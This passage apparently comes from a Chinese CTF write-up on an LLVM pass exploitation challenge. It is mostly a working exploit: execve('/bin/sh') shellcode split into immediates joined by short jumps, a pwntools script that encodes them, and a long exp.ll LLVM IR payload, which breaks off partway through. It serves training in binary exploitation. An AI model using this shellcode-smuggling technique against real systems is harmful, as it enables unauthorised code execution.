攻击</h3>\n<p>展开攻击，首先我们第一次可以溢出成可控的立即数，接着我们来进行第二次执行 shellcode 的编写</p>\n<p>先不考虑 getshell 的问题，我们的长度也要刚好溢出并且写不进 ret 这样就会执行残留的 shellcode</p>\n<blockquote>\n<p>3*9 + 13*311= 0xff0 - 10</p>\n</blockquote>\n<p>运行后断到第二次 <code>call shellcode</code> ，果然没有写进 ret，并且已经把这个立即数当成 shellcode 执行了</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220816143329327.png\" alt=\"image-20220816143329327\"></p>\n<p>接下来就是把这个立即数改成一个跳转指令 ，之后就可以跳到其他立即数中了每个立即数长 8 字节要分出 2 个字节来写跳转指令，所以每条指令长度不能超过 6，然后是 shellcode 的编写，首先是每次的跳转指令，因为要跳到下一个立即数段</p>\n<p>每 13 字节的指令中</p>\n<blockquote>\n<p>2 + 8 + 3</p>\n<p>其中 8 字节为可控字节</p>\n</blockquote>\n<p>因为是栈操作后指令会倒过来，第一次跳转应为<em>负</em>的  <code>8+3=11</code>  字节，之后的每一次跳转应为<em>负</em>的  <code>8+2+3+8-2=19 </code> 字节，成功实现跳转</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220816162029472.png\" alt=\"image-20220816162029472\"></p>\n<p>这题的核心在于构造 shellcode，而构造 shellcode 的核心在于 binsh 字符串，我认为可以使用 <code>mov edi,xxx</code>  之类的指令，可以减少长度，之后用寄存器左移指令移动到寄存器的高位，这样就可以写出如下 shellcode</p>\n<pre class=\"language-none\"><code class=\"language-none\">mov edi , 0x68732f\nshl rdi , 32\nmov esi , 0x6e69622f\nadd rdi , rsi\npush rdi\nmov rdi , rsp\nxor rsi , rsi\nxor rdx , rdx\nmov eax , 0x3B\nsyscall</code></pre>\n<p>写一个 py 脚本生成一下立即数</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\ncontext<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span> os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch <span class=\"token operator\">=</span> <span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>timeout <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># for i in range(408):</span>\n<span class=\"token comment\">#     print('%&#123;&#125; = add nsw i64 %&#123;&#125;, 43499'.format(i+1,i))</span>\n\n<span class=\"token comment\"># for i in range(999):</span>\n<span class=\"token comment\">#     for j in range(999):</span>\n<span class=\"token comment\">#         if (3*i + j*13 ==(0xff0-10)):</span>\n<span class=\"token comment\">#             print(i,j)</span>\n\nshellcode <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n    <span class=\"token string\">'mov edi , 0x68732f'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'shl rdi , 32'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'mov esi , 0x6e69622f'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'add rdi , rsi'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'push rdi'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'mov rdi , rsp'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'xor rsi , rsi'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'xor rdx , rdx'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'mov eax , 0x3B'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'syscall'</span>\n<span class=\"token punctuation\">]</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> shellcode<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span> u64<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">6</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x90'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> asm<span class=\"token punctuation\">(</span><span class=\"token string\">\"jmp $-19\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></code></pre>\n<p>运行优化 exp 可以 getshell</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220816162205717.png\" alt=\"image-20220816162205717\"></p>\n<p>最后的 <code>exp.ll</code>  文件</p>\n<pre class=\"language-none\"><code class=\"language-none\">define dso_local i64 @test1(i64 %0) local_unnamed_addr #0 &#123;\n  %2 &#x3D; add nsw i64 %0, 62443\n  %3 &#x3D; add nsw i64 %2, 43499\n  %4 &#x3D; add nsw i64 %3, 43499\n  %5 &#x3D; add nsw i64 %4, 43499\n  %6 &#x3D; add nsw i64 %5, 43499\n  %7 &#x3D; add nsw i64 %6, 43499\n  %8 &#x3D; add nsw i64 %7, 43499\n  %9 &#x3D; add nsw i64 %8, 43499\n  %10 &#x3D; add nsw i64 %9, 43499\n  %11 &#x3D; add nsw i64 %10, 43499\n  %12 &#x3D; add nsw i64 %11, 43499\n  %13 &#x3D; add nsw i64 %12, 43499\n  %14 &#x3D; add nsw i64 %13, 43499\n  %15 &#x3D; add nsw i64 %14, 43499\n  %16 &#x3D; add nsw i64 %15, 43499\n  %17 &#x3D; add nsw i64 %16, 43499\n  %18 &#x3D; add nsw i64 %17, 43499\n  %19 &#x3D; add nsw i64 %18, 43499\n  %20 &#x3D; add nsw i64 %19, 43499\n  %21 &#x3D; add nsw i64 %20, 43499\n  %22 &#x3D; add nsw i64 %21, 43499\n  %23 &#x3D; add nsw i64 %22, 43499\n  %24 &#x3D; add nsw i64 %23, 43499\n  %25 &#x3D; add nsw i64 %24, 43499\n  %26 &#x3D; add nsw i64 %25, 43499\n  %27 &#x3D; add nsw i64 %26, 43499\n  %28 &#x3D; add nsw i64 %27, 43499\n  %29 &#x3D; add nsw i64 %28, 43499\n  %30 &#x3D; add nsw i64 %29, 43499\n  %31 &#x3D; add nsw i64 %30, 43499\n  %32 &#x3D; add nsw i64 %31, 43499\n  %33 &#x3D; add nsw i64 %32, 43499\n  %34 &#x3D; add nsw i64 %33, 43499\n  %35 &#x3D; add nsw i64 %34, 43499\n  %36 &#x3D; add nsw i64 %35, 43499\n  %37 &#x3D; add nsw i64 %36, 43499\n  %38 &#x3D; add nsw i64 %37, 43499\n  %39 &#x3D; add nsw i64 %38, 43499\n  %40 &#x3D; add nsw i64 %39, 43499\n  %41 &#x3D; add nsw i64 %40, 43499\n  %42 &#x3D; add nsw i64 %41, 43499\n  %43 &#x3D; add nsw i64 %42, 43499\n  %44 &#x3D; add nsw i64 %43, 43499\n  %45 &#x3D; add nsw i64 %44, 43499\n  %46 &#x3D; add nsw i64 %45, 43499\n  %47 &#x3D; add nsw i64 %46, 43499\n  %48 &#x3D; add nsw i64 %47, 43499\n  %49 &#x3D; add nsw i64 %48, 43499\n  %50 &#x3D; add nsw i64 %49, 43499\n  %51 &#x3D; add nsw i64 %50, 43499\n  %52 &#x3D; add nsw i64 %51, 43499\n  %53 &#x3D; add nsw i64 %52, 43499\n  %54 &#x3D; add nsw i64 %53, 43499\n  %55 &#x3D; add nsw i64 %54, 43499\n  %56 &#x3D; add nsw i64 %55, 43499\n  %57 &#x3D; add nsw i64 %56, 43499\n  %58 &#x3D; add nsw i64 %57, 43499\n  %59 &#x3D; add nsw i64 %58, 43499\n  %60 &#x3D; add nsw i64 %59, 43499\n  %61 &#x3D; add nsw i64 %60, 43499\n  %62 &#x3D; add nsw i64 %61, 43499\n  %63 &#x3D; add nsw i64 %62, 43499\n  %64 &#x3D; add nsw i64 %63, 43499\n  %65 &#x3D; add nsw i64 %64, 43499\n  %66 &#x3D; add nsw i64 %65, 43499\n  %67 &#x3D; add nsw i64 %66, 43499\n  %68 &#x3D; add nsw i64 %67, 43499\n  %69 &#x3D; add nsw i64 %68, 43499\n  %70 &#x3D; add nsw i64 %69, 43499\n  %71 &#x3D; add nsw i64 %70, 43499\n  %72 &#x3D; add nsw i64 %71, 43499\n  %73 &#x3D; add nsw i64 %72, 43499\n  %74 &#x3D; add nsw i64 %73, 43499\n  %75 &#x3D; add nsw i64 %74, 43499\n  %76 &#x3D; add nsw i64 %75, 43499\n  %77 &#x3D; add nsw i64 %76, 43499\n  %78 &#x3D; add nsw i64 %77, 43499\n  %79 &#x3D; add nsw i64 %78, 43499\n  %80 &#x3D; add nsw i64 %79, 43499\n  %81 &#x3D; add nsw i64 %80, 43499\n  %82 &#x3D; add nsw i64 %81, 43499\n  %83 &#x3D; add nsw i64 %82, 43499\n  %84 &#x3D; add nsw i64 %83, 43499\n  %85 &#x3D; add nsw i64 %84, 43499\n  %86 &#x3D; add nsw i64 %85, 43499\n  %87 &#x3D; add nsw i64 %86, 43499\n  %88 &#x3D; add nsw i64 %87, 43499\n  %89 &#x3D; add nsw i64 %88, 43499\n  %90 &#x3D; add nsw i64 %89, 43499\n  %91 &#x3D; add nsw i64 %90, 43499\n  %92 &#x3D; add nsw i64 %91, 43499\n  %93 &#x3D; add nsw i64 %92, 43499\n  %94 &#x3D; add nsw i64 %93, 43499\n  %95 &#x3D; add nsw i64 %94, 43499\n  %96 &#x3D; add nsw i64 %95, 43499\n  %97 &#x3D; add nsw i64 %96, 43499\n  %98 &#x3D; add nsw i64 %97, 43499\n  %99 &#x3D; add nsw i64 %98, 43499\n  %100 &#x3D; add nsw i64 %99, 43499\n  %101 &#x3D; add nsw i64 %100, 43499\n  %102 &#x3D; add nsw i64 %101, 43499\n  %103 &#x3D; add nsw i64 %102, 43499\n  %104 &#x3D; add nsw i64 %103, 43499\n  %105 &#x3D; add nsw i64 %104, 43499\n  %106 &#x3D; add nsw i64 %105, 43499\n  %107 &#x3D; add nsw i64 %106, 43499\n  %108 &#x3D; add nsw i64 %107, 43499\n  %109 &#x3D; add nsw i64 %108, 43499\n  %110 &#x3D; add nsw i64 %109, 43499\n  %111 &#x3D; add nsw i64 %110, 43499\n  %112 &#x3D; add nsw i64 %111, 43499\n  %113 &#x3D; add nsw i64 %112, 43499\n  %114 &#x3D; add nsw i64 %113, 43499\n  %115 &#x3D; add nsw i64 %114, 43499\n  %116 &#x3D; add nsw i64 %115, 43499\n  %117 &#x3D; add nsw i64 %116, 43499\n  %118 &#x3D; add nsw i64 %117, 43499\n  %119 &#x3D; add nsw i64 %118, 43499\n  %120 &#x3D; add nsw i64 %119, 43499\n  %121 &#x3D; add nsw i64 %120, 43499\n  %122 &#x3D; add nsw i64 %121, 43499\n  %123 &#x3D; add nsw i64 %122, 43499\n  %124 &#x3D; add nsw i64 %123, 43499\n  %125 &#x3D; add nsw i64 %124, 43499\n  %126 &#x3D; add nsw i64 %125, 43499\n  %127 &#x3D; add nsw i64 %126, 43499\n  %128 &#x3D; add nsw i64 %127, 43499\n  %129 &#x3D; add nsw i64 %128, 43499\n  %130 &#x3D; add nsw i64 %129, 43499\n  %131 &#x3D; add nsw i64 %130, 43499\n  %132 &#x3D; add nsw i64 %131, 43499\n  %133 &#x3D; add nsw i64 %132, 43499\n  %134 &#x3D; add nsw i64 %133, 43499\n  %135 &#x3D; add nsw i64 %134, 43499\n  %136 &#x3D; add nsw i64 %135, 43499\n  %137 &#x3D; add nsw i64 %136, 43499\n  %138 &#x3D; add nsw i64 %137, 43499\n  %139 &#x3D; add nsw i64 %138, 43499\n  %140 &#x3D; add nsw i64 %139, 43499\n  %141 &#x3D; add nsw i64 %140, 43499\n  %142 &#x3D; add nsw i64 %141, 43499\n  %143 &#x3D; add nsw i64 %142, 43499\n  %144 &#x3D; add nsw i64 %143, 43499\n  %145 &#x3D; add nsw i64 %144, 43499\n  %146 &#x3D; add nsw i64 %145, 43499\n  %147 &#x3D; add nsw i64 %146, 43499\n  %148 &#x3D; add nsw i64 %147, 43499\n  %149 &#x3D; add nsw i64 %148, 43499\n  %150 &#x3D; add nsw i64 %149, 43499\n  %151 &#x3D; add nsw i64 %150, 43499\n  %152 &#x3D; add nsw i64 %151, 43499\n  %153 &#x3D; add nsw i64 %152, 43499\n  %154 &#x3D; add nsw i64 %153, 43499\n  %155 &#x3D; add nsw i64 %154, 43499\n  %156 &#x3D; add nsw i64 %155, 43499\n  %157 &#x3D; add nsw i64 %156, 43499\n  %158 &#x3D; add nsw i64 %157, 43499\n  %159 &#x3D; add nsw i64 %158, 43499\n  %160 &#x3D; add nsw i64 %159, 43499\n  %161 &#x3D; add nsw i64 %160, 43499\n  %162 &#x3D; add nsw i64 %161, 43499\n  %163 &#x3D; add nsw i64 %162, 43499\n  %164 &#x3D; add nsw i64 %163, 43499\n  %165 &#x3D; add nsw i64 %164, 43499\n  %166 &#x3D; add nsw i64 %165, 43499\n  %167 &#x3D; add nsw i64 %166, 43499\n  %168 &#x3D; add nsw i64 %167, 43499\n  %169 &#x3D; add nsw i64 %168, 43499\n  %170 &#x3D; add nsw i64 %169, 43499\n  %171 &#x3D; add nsw i64 %170, 43499\n  %172 &#x3D; add nsw i64 %171, 43499\n  %173 &#x3D; add nsw i64 %172, 43499\n  %174 &#x3D; add nsw i64 %173, 43499\n  %175 &#x3D; add nsw i64 %174, 43499\n  %176 &#x3D; add nsw i64 %175, 43499\n  %177 &#x3D; add nsw i64 %176, 43499\n  %178 &#x3D; add nsw i64 %177, 43499\n  %179 &#x3D; add nsw i64 %178, 43499\n  %180 &#x3D; add nsw i64 %179, 43499\n  %181 &#x3D; add nsw i64 %180, 43499\n  %182 &#x3D; add nsw i64 %181, 43499\n  %183 &#x3D; add nsw i64 %182, 43499\n  %184 &#x3D; add nsw i64 %183, 43499\n  %185 &#x3D; add nsw i64 %184, 43499\n  %186 &#x3D; add nsw i64 %185, 43499\n  %187 &#x3D; add nsw i64 %186, 43499\n  %188 &#x3D; add nsw i64 %187, 43499\n  %189 &#x3D; add nsw i64 %188, 43499\n  %190 &#x3D; add nsw i64 %189, 43499\n  %191 &#x3D; add nsw i64 %190, 43499\n  %192 &#x3D; add nsw i64 %191, 43499\n  %193 &#x3D; add nsw i64 %192, 43499\n  %194 &#x3D; add nsw i64 %193, 43499\n  %195 &#x3D; add nsw i64 %194, 43499\n  %196 &#x3D; add nsw i64 %195, 43499\n  %197 &#x3D; add nsw i64 %196, 43499\n  %198 &#x3D; add nsw i64 %197, 43499\n  %199 &#x3D; add nsw i64 %198, 43499\n  %200 &#x3D; add nsw i64 %199, 43499\n  %201 &#x3D; add nsw i64 %200, 43499\n  %202 &#x3D; add nsw i64 %201, 43499\n  %203 &#x3D; add nsw i64 %202, 43499\n  %204 &#x3D; add nsw i64 %203, 43499\n  %205 &#x3D; add nsw i64 %204, 43499\n  %206 &#x3D; add nsw i64 %205, 43499\n  %207 &#x3D; add nsw i64 %206, 43499\n  %208 &#x3D; add nsw i64 %207, 43499\n  %209 &#x3D; add nsw i64 %208, 43499\n  %210 &#x3D; add nsw i64 %209, 43499\n  %211 &#x3D; add nsw i64 %210, 43499\n  %212 &#x3D; add nsw i64 %211, 43499\n  %213 &#x3D; add nsw i64 %212, 43499\n  %214 &#x3D; add nsw i64 %213, 43499\n  %215 &#x3D; add nsw i64 %214, 43499\n  %216 &#x3D; add nsw i64 %215, 43499\n  %217 &#x3D; add nsw i64 %216, 43499\n  %218 &#x3D; add nsw i64 %217, 43499\n  %219 &#x3D; add nsw i64 %218, 43499\n  %220 &#x3D; add nsw i64 %219, 43499\n  %221 &#x3D; add nsw i64 %220, 43499\n  %222 &#x3D; add nsw i64 %221, 43499\n  %223 &#x3D; add nsw i64 %222, 43499\n  %224 &#x3D; add nsw i64 %223, 43499\n  %225 &#x3D; add nsw i64 %224, 43499\n  %226 &#x3D; add nsw i64 %225, 43499\n  %227 &#x3D; add nsw i64 %226, 43499\n  %228 &#x3D; add nsw i64 %227, 43499\n  %229 &#x3D; add nsw i64 %228, 43499\n  %230 &#x3D; add nsw i64 %229, 43499\n  %231 &#x3D; add nsw i64 %230, 43499\n  %232 &#x3D; add nsw i64 %231, 43499\n  %233 &#x3D; add nsw i64 %232, 43499\n  %234 &#x3D; add nsw i64 %233, 43499\n  %235 &#x3D; add nsw i64 %234, 43499\n  %236 &#x3D; add nsw i64 %235, 43499\n  %237 &#x3D; add nsw i64 %236, 43499\n  %238 &#x3D; add nsw i64 %237, 43499\n  %239 &#x3D; add nsw i64 %238, 43499\n  %240 &#x3D; add nsw i64 %239, 43499\n  %241 &#x3D; add nsw i64 %240, 43499\n  %242 &#x3D; add nsw i64 %241, 43499\n  %243 &#x3D; add nsw i64 %242, 43499\n  %244 &#x3D; add nsw i64 %243, 43499\n  %245 &#x3D; add nsw i64 %244, 43499\n  %246 &#x3D; add nsw i64 %245, 43499\n  %247 &#x3D; add nsw i64 %246, 43499\n  %248 &#x3D; add nsw i64 %247, 43499\n  %249 &#x3D; add nsw i64 %248, 43499\n  %250 &#x3D; add nsw i64 %249, 43499\n  %251 &#x3D; add nsw i64 %250, 43499\n  %252 &#x3D; add nsw i64 %251, 43499\n  %253 &#x3D; add nsw i64 %252, 43499\n  %254 &#x3D; add nsw i64 %253, 43499\n  %255 &#x3D; add nsw i64 %254, 43499\n  %256 &#x3D; add nsw i64 %255, 43499\n  %257 &#x3D; add nsw i64 %256, 43499\n  %258 &#x3D; add nsw i64 %257, 43499\n  %259 &#x3D; add nsw i64 %258, 43499\n  %260 &#x3D; add nsw i64 %259, 43499\n  %261 &#x3D; add nsw i64 %260, 43499\n  %262 &#x3D; add nsw i64 %261, 43499\n  %263 &#x3D; add nsw i64 %262, 43499\n  %264 &#x3D; add nsw i64 %263, 43499\n  %265 &#x3D; add nsw i64 %264, 43499\n  %266 &#x3D; add nsw i64 %265, 43499\n  %267 &#x3D; add nsw i64 %266, 43499\n  %268 &#x3D; add nsw i64 %267, 43499\n  %269 &#x3D; add nsw i64 %268, 43499\n  %270 &#x3D; add nsw i64 %269, 43499\n  %271 &#x3D; add nsw i64 %270, 43499\n  %272 &#x3D; add nsw i64 %271, 43499\n  %273 &#x3D; add nsw i64 %272, 43499\n  %274 &#x3D; add nsw i64 %273, 43499\n  %275 &#x3D; add nsw i64 %274, 43499\n  %276 &#x3D; add nsw i64 %275, 43499\n  %277 &#x3D; add nsw i64 %276, 43499\n  %278 &#x3D; add nsw i64 %277, 43499\n  %279 &#x3D; add nsw i64 %278, 43499\n  %280 &#x3D; add nsw i64 %279, 43499\n  %281 &#x3D; add nsw i64 %280, 43499\n  %282 &#x3D; add nsw i64 %281, 43499\n  %283 &#x3D; add nsw i64 %282, 43499\n  %284 &#x3D; add nsw i64 %283, 43499\n  %285 &#x3D; add nsw i64 %284, 43499\n  %286 &#x3D; add nsw i64 %285, 43499\n  %287 &#x3D; add nsw i64 %286, 43499\n  %288 &#x3D; add nsw i64 %287, 43499\n  %289 &#x3D; add nsw i64 %288, 43499\n  %290 &#x3D; add nsw i64 %289, 43499\n  %291 &#x3D; add nsw i64 %290, 43499\n  %292 &#x3D; add nsw i64 %291, 43499\n  %293 &#x3D; add nsw i64 %292, 43499\n  %294 &#x3D; add nsw i64 %293, 43499\n  %295 &#x3D; add nsw i64 %294, 43499\n  %296 &#x3D; add nsw i64 %295, 43499\n  %297 &#x3D; add nsw i64 %296, 43499\n  %298 &#x3D; add nsw i64 %297, 43499\n  %299 &#x3D; add nsw i64 %298, 43499\n  %300 &#x3D; add nsw i64 %299, 43499\n  %301 &#x3D; add nsw i64 %300, 43499\n  %302 &#x3D; add nsw i64 %301, 43499\n  %303 &#x3D; add nsw i64 %302, 43499\n  %304 &#x3D; add nsw i64 %303, 43499\n  %305 &#x3D; add nsw i64 %304, 43499\n  %306 &#x3D; add nsw i64 %305, 43499\n  %307 &#x3D; add nsw i64 %306, 43499\n  %308 &#x3D; add nsw i64 %307, 43499\n  %309 &#x3D; add nsw i64 %308, 43499\n  %310 &#x3D; add nsw i64 %309, 43499\n  %311 &#x3D; add nsw i64 %310, 43499\n  %312 &#x3D; add nsw i64 %311, 43499\n  %313 &#x3D; add nsw i64 %312, 43499\n  %314 &#x3D; add nsw i64 %313, 43499\n  %315 &#x3D; add nsw i64 %314, 1\n  %316 &#x3D; add nsw i64 %315, 1\n  %317 &#x3D; add nsw i64 %316, 1\n  %318 &#x3D; add nsw i64 %317, 1\n\n  ret i64 %318\n&#125;\n\ndefine dso_local i64 @test2(i64 %0) local_unnamed_addr #0 &#123;\n  %2 &#x3D; add nsw i64 %0, 16999839549866848191\n  %3 &#x3D; add nsw i64 %2, 16999840167141818696\n  %4 &#x3D; add nsw i64 %3, 16999840022328913854\n  %5 &#x3D; add nsw i64 %4, 16999840169021866312\n  %6 &#x3D; add nsw i64 %5, 16999840169015152727\n  %7 &#x3D; add nsw i64 %6, 16999840169020852552\n  %8 &#x3D; add nsw i64 %7, 16999840169021813064\n  %9 &#x3D; add nsw i64 %8, 16999840169019453768\n  %10 &#x3D; add nsw i64 %9, 16999839548114484152\n  %11 &#x3D; add nsw i64 %10, 16999840169015117071\n  %12 &#x3D; add nsw i64 %11, 43499\n  %13 &#x3D; add nsw i64 %12, 43499\n  %14 &#x3D; add nsw i64 %13, 43499\n  %15 &#x3D; add nsw i64 %14, 43499\n  %16 &#x3D; add nsw i64 %15, 43499\n  %17 &#x3D; add nsw i64 %16, 43499\n  %18 &#x3D; add nsw i64 %17, 43499\n  %19 &#x3D; add nsw i64 %18, 43499\n  %20 &#x3D; add nsw i64 %19, 43499\n  %21 &#x3D; add nsw i64 %20, 43499\n  %22 &#x3D; add nsw i64 %21, 43499\n  %23 &#x3D; add nsw i64 %22, 43499\n  %24 &#x3D; add nsw i64 %23, 43499\n  %25 &#x3D; add nsw i64 %24, 43499\n  %26 &#x3D; add nsw i64 %25, 43499\n  %27 &#x3D; add nsw i64 %26, 43499\n  %28 &#x3D; add nsw i64 %27, 43499\n  %29 &#x3D; add nsw i64 %28, 43499\n  %30 &#x3D; add nsw i64 %29, 43499\n  %31 &#x3D; add nsw i64 %30, 43499\n  %32 &#x3D; add nsw i64 %31, 43499\n  %33 &#x3D; add nsw i64 %32, 43499\n  %34 &#x3D; add nsw i64 %33, 43499\n  %35 &#x3D; add nsw i64 %34, 43499\n  %36 &#x3D; add nsw i64 %35, 43499\n  %37 &#x3D; add nsw i64 %36, 43499\n  %38 &#x3D; add nsw i64 %37, 43499\n  %39 &#x3D; add nsw i64 %38, 43499\n  %40 &#x3D; add nsw i64 %39, 43499\n  %41 &#x3D; add nsw i64 %40, 43499\n  %42 &#x3D; add nsw i64 %41, 43499\n  %43 &#x3D; add nsw i64 %42, 43499\n  %44 &#x3D; add nsw i64 %43, 43499\n  %45 &#x3D; add nsw i64 %44, 43499\n  %46 &#x3D; add nsw i64 %45, 43499\n  %47 &#x3D; add nsw i64 %46, 43499\n  %48 &#x3D; add nsw i64 %47, 43499\n  %49 &#x3D; add nsw i64 %48, 43499\n  %50 &#x3D; add nsw i64 %49, 43499\n  %51 &#x3D; add nsw i64 %50, 43499\n  %52 &#x3D; add nsw i64 %51, 43499\n  %53 &#x3D; add nsw i64 %52, 43499\n  %54 &#x3D; add nsw i64 %53, 43499\n  %55 &#x3D; add nsw i64 %54, 43499\n  %56 &#x3D; add nsw i64 %55, 43499\n  %57 &#x3D; add nsw i64 %56, 43499\n  %58 &#x3D; add nsw i64 %57, 43499\n  %59 &#x3D; add nsw i64 %58, 43499\n  %60 &#x3D; add nsw i64 %59, 43499\n  %61 &#x3D; add nsw i64 %60, 43499\n  %62 &#x3D; add nsw i64 %61, 43499\n  %63 &#x3D; add nsw i64 %62, 43499\n  %64 &#x3D; add nsw i64 %63, 43499\n  %65 &#x3D; add nsw i64 %64, 43499\n  %66 &#x3D; add nsw i64 %65, 43499\n  %67 &#x3D; add nsw i64 %66, 43499\n  %68 &#x3D; add nsw i64 %67, 43499\n  %69 &#x3D; add nsw i64 %68, 43499\n  %70 &#x3D; add nsw i64 %69, 43499\n  %71 &#x3D; add nsw i64 %70, 43499\n  %72 &#x3D; add nsw i64 %71, 43499\n  %73 &#x3D; add nsw i64 %72, 43499\n  %74 &#x3D; add nsw i64 %73, 43499\n  %75 &#x3D; add nsw i64 %74, 43499\n  %76 &#x3D; add nsw i64 %75, 43499\n  %77 &#x3D; add nsw i64 %76, 43499\n  %78 &#x3D; add nsw i64 %77, 43499\n  %79 &#x3D; add nsw i64 %78, 43499\n  %80 &#x3D; add nsw i64 %79, 43499\n  %81 &#x3D; add nsw i64 %80, 43499\n  %82 &#x3D; add nsw i64 %81, 43499\n  %83 &#x3D; add nsw i64 %82, 43499\n  %84 &#x3D; add nsw i64 %83, 43499\n  %85 &#x3D; add nsw i64 %84, 43499\n  %86 &#x3D; add nsw i64 %85, 43499\n  %87 &#x3D; add nsw i64 %86, 43499\n  %88 &#x3D; add nsw i64 %87, 43499\n  %89 &#x3D; add nsw i64 %88, 43499\n  %90 &#x3D; add nsw i64 %89, 43499\n  %91 &#x3D; add nsw i64 %90, 43499\n  %92 &#x3D; add nsw i64 %91, 43499\n  %93 &#x3D; add nsw i64 %92, 43499\n  %94 &#x3D; add nsw i64 %93, 43499\n  %95 &#x3D; add nsw i64 %94, 43499\n  %96 &#x3D; add nsw i64 %95, 43499\n  %97 &#x3D; add nsw i64 %96, 43499\n  %98 &#x3D; add nsw i64 %97, 43499\n  %99 &#x3D; add nsw i64 %98, 43499\n  %100 &#x3D; add nsw i64 %99, 43499\n  %101 &#x3D; add nsw i64 %100, 43499\n  %102 &#x3D; add nsw i64 %101, 43499\n  %103 &#x3D; add nsw i64 %102, 43499\n  %104 &#x3D; add nsw i64 %103, 43499\n  %105 &#x3D; add nsw i64 %104, 43499\n  %106 &#x3D; add nsw i64 %105, 43499\n  %107 &#x3D; add nsw i64 %106, 43499\n  %108 &#x3D; add nsw i64 %107, 43499\n  %109 &#x3D; add nsw i64 %108, 43499\n  %110 &#x3D; add nsw i64 %109, 43499\n  %111 &#x3D; add nsw i64 %110, 43499\n  %112 &#x3D; add nsw i64 %111, 43499\n  %113 &#x3D; add nsw i64 %112, 43499\n  %114 &#x3D; add nsw i64 %113, 43499\n  %115 &#x3D; add nsw i64 %114, 43499\n  %116 &#x3D; add nsw i64 %115, 43499\n  %117 &#x3D; add nsw i64 %116, 43499\n  %118 &#x3D; add nsw i64 %117, 43499\n  %119 &#x3D; add nsw i64 %118, 43499\n  %120 &#x3D; add nsw i64 %119, 43499\n  %121 &#x3D; add nsw i64 %120, 43499\n  %122 &#x3D; add nsw i64 %121, 43499\n  %123 &#x3D; add nsw i64 %122, 43499\n  %124 &#x3D; add nsw i64 %123, 43499\n  %125 &#x3D; add nsw i64 %124, 43499\n  %126 &#x3D; add nsw i64 %125, 43499\n  %127 &#x3D; add nsw i64 %126, 43499\n  %128 &#x3D; add nsw i64 %127, 43499\n  %129 &#x3D; add nsw i64 %128, 43499\n  %130 &#x3D; add nsw i64 %129, 43499\n  %131 &#x3D; add nsw i64 %130, 43499\n  %132 &#x3D; add nsw i64 %131, 43499\n  %133 &#x3D; add nsw i64 %132, 43499\n  %134 &#x3D; add nsw i64 %133, 43499\n  %135 &#x3D; add nsw i64 %134, 43499\n  %136 &#x3D; add nsw i64 %135, 43499\n  %137 &#x3D; add nsw i64 %136, 43499\n  %138 &#x3D; add nsw i64 %137, 43499\n  %139 &#x3D; add nsw i64 %138, 43499\n  %140 &#x3D; add nsw i64 %139, 43499\n  %141 &#x3D; add nsw i64 %140, 43499\n  %142 &#x3D; add nsw i64 %141, 43499\n  %143 &#x3D; add nsw i64 %142, 43499\n  %144 &#x3D; add nsw i64 %143, 43499\n  %145 &#x3D; add nsw i64 %144, 43499\n  %146 &#x3D; add nsw i64 %145, 43499\n  %147 &#x3D; add nsw i64 %146, 43499\n  %148 &#x3D; add nsw i64 %147, 43499\n  %149 &#x3D; add nsw i64 %148, 43499\n  %150 &#x3D; add nsw i64 %149, 43499\n  %151 &#x3D; add nsw i64 %150, 43499\n  %152 &#x3D; add nsw i64 %151, 43499\n  %153 &#x3D; add nsw i64 %152, 43499\n  %154 &#x3D; add nsw i64 %153, 43499\n  %155 &#x3D; add nsw i64 %154, 43499\n  %156 &#x3D; add nsw i64 %155, 43499\n  %157 &#x3D; add nsw i64 %156, 43499\n  %158 &#x3D; add nsw i64 %157, 43499\n  %159 &#x3D; add nsw i64 %158, 43499\n  %160 &#x3D; add nsw i64 %159, 43499\n  %161 &#x3D; add nsw i64 %160, 43499\n  %162 &#x3D; add nsw i64 %161, 43499\n  %163 &#x3D; add nsw i64 %162, 43499\n  %164 &#x3D; add nsw i64 %163, 43499\n  %165 &#x3D; add nsw i64 %164, 43499\n  %166 &#x3D; add nsw i64 %165, 43499\n  %167 &#x3D; add nsw i64 %166, 43499\n  %168 &#x3D; add nsw i64 %167, 43499\n  %169 &#x3D; add nsw i64 %168, 43499\n  %170 &#x3D; add nsw i64 %169, 43499\n  %171 &#x3D; add nsw i64 %170, 43499\n  %172 &#x3D; add nsw i64 %171, 43499\n  %173 &#x3D; add nsw i64 %172, 43499\n  %174 &#x3D; add nsw i64 %173, 43499\n  %175 &#x3D; add nsw i64 %174, 43499\n  %176 &#x3D; add nsw i64 %175, 43499\n  %177 &#x3D; add nsw i64 %176, 43499\n  %178 &#x3D; add nsw i64 %177, 43499\n  %179 &#x3D; add nsw i64 %178, 43499\n  %180 &#x3D; add nsw i64 %179, 43499\n  %181 &#x3D; add nsw i64 %180, 43499\n  %182 &#x3D; add nsw i64 %181, 43499\n  %183 &#x3D; add nsw i64 %182, 